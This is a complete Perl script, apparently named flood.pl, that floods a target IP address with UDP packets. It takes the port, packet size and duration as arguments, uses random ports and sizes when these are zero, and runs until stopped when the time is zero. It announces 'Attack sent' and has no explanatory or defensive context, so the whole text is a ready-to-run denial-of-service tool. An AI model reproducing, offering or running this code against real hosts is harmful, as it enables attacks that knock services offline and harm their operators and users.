#!/usr/bin/perl

use Socket;
use strict;

if ($#ARGV != 3) {
  print "flood.pl <ip> <port> <size> <time>\n\n";
  print " port=0: use random ports\n";
  print " size=0: use random size between 64 and 1024\n";
  print " time=0: continuous flood\n";
  exit(1);
}

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);

my $proto = getprotobyname('udp');

socket(flood, PF_INET, SOCK_DGRAM, $proto);

print "Attack sent. Details: " . ($port ? "port $port" : "random") . " " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . ".\n";
print "Break with Ctrl+C" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}